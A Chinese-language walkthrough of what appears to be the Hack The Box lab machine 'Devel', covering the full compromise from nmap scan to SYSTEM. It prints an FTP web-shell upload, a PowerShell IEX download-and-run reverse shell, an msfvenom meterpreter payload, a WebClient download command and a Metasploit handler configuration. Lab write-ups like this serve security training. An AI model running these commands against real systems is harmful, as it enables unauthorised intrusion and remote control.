![image-20220402130554301](https://raw.githubusercontent.com/huamang/image/master/image-20220402130554301.png)

先用nmap进行扫描，开启了21和80端口

![image-20220402130912063](https://raw.githubusercontent.com/huamang/image/master/image-20220402130912063.png)

ftp可以直接访问

![image-20220402151228036](https://raw.githubusercontent.com/huamang/image/master/image-20220402151228036.png)

80端口的web服务看一下，是IIS的默认页面

![image-20220402151536232](https://raw.githubusercontent.com/huamang/image/master/image-20220402151536232.png)

也就对应着ftp进去的地方，这里我们可以直接传马上去执行命令

```
lcd /root/桌面/
put cmdexec.aspx
```

![image-20220402153630422](https://raw.githubusercontent.com/huamang/image/master/image-20220402153630422.png)

成功传上去

![image-20220402153731399](https://raw.githubusercontent.com/huamang/image/master/image-20220402153731399.png)

执行命令成功

![image-20220402153848718](https://raw.githubusercontent.com/huamang/image/master/image-20220402153848718.png)

试着反弹一个shell过来，这里使用的是Invoke-PowerShellTcp.ps1

把ip和端口配置好，然后开python服务把文件通过命令传上去

![image-20220402155442211](https://raw.githubusercontent.com/huamang/image/master/image-20220402155442211.png)

```powershell
powershell.exe "IEX(New-Object Net.WebClient).downloadString(‘http://10.10.16.4:8000/Invoke-PowerShellTcp.ps1')"
```

成功收到反弹的shell

![image-20220402161257212](https://raw.githubusercontent.com/huamang/image/master/image-20220402161257212.png)

三个用户都没有权限进入，只能提权了

![image-20220402163447244](https://raw.githubusercontent.com/huamang/image/master/image-20220402163447244.png)

systeminfo提取一下系统信息，再查一下提权漏洞

```
Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ??
System Boot Time:          2/4/2022, 8:04:45 ??
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.460 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.533 MB
Virtual Memory: In Use:    608 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
                                 [02]: fe80::58c0:f1cf:abc6:bb9e
                                 [03]: dead:beef::5005:d519:e7a8:eefd
                                 [04]: dead:beef::58c0:f1cf:abc6:bb9e
```

执行windows-exploit-suggester

![image-20220402163347926](https://raw.githubusercontent.com/huamang/image/master/image-20220402163347926.png)

上线msf打方便一点，生成一个后门

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.4 LPORT=5555 -f exe > shell.exe
```

再传上去

```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.4:8000/shell.exe', '.\shell.exe')"
```

![image-20220402164750535](https://raw.githubusercontent.com/huamang/image/master/image-20220402164750535.png)

配置一下msf

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.16.4
set lport 5555
```

收到shell

![image-20220402165126559](https://raw.githubusercontent.com/huamang/image/master/image-20220402165126559.png)

再直接用提权模块打

试着用ms13-005来打一下，但是发现打不通

![image-20220402170228532](https://raw.githubusercontent.com/huamang/image/master/image-20220402170228532.png)

search几个，发现ms10-015是有模块的，那就用这个模块来打

提权成功，直接到了system

![image-20220402170551539](https://raw.githubusercontent.com/huamang/image/master/image-20220402170551539.png)

一次拿了俩

![image-20220402170757817](https://raw.githubusercontent.com/huamang/image/master/image-20220402170757817.png)